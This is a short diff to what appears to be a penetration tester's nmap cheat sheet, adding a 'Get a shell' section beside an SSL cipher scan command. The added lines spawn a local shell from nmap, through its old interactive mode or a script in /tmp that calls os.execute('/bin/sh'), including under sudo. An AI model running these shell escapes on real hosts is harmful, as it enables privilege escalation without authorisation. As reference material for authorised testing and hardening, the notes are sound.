@@ -20,3 +20,14 @@ recording whether a host accepts or rejects it. The end result is a list of all 
 
 	nmap -sV  -p <port> --script=ssl-enum-ciphers <host>
 
+Get a shell
+-------------------------
+
+	nmap --interactive OR sudo nmap --interactive
+	nmap> !sh
+
+        ----
+
+        echo "os.execute('/bin/sh')" > /tmp/shell.nse
+        nmap --script=/tmp/shell.nse
+
